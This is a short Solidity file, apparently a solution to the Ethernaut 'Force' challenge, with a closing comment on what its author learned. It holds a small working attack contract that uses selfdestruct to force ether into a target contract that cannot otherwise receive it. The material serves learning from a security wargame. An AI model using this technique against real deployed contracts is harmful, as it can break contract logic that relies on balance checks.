pragma solidity ^0.6.0;

contract ForceSol {

    function attackContract(address payable _target) public payable {
        selfdestruct(_target);
    }

    receive() external payable {

    }
}

/*
In this contract, it self destroys and force to send ether to
a contract in Force.sol file. I learnt that in order to receive ether 
to a contract via a function, it SHOULD have the keyword "payable", otherwise
the EVM reverts the transaction But, I realized that it is not the only way; 
the Ethernaut taught me that any contract should not depend on
address(this).balance == 0 for any contract logic.
*/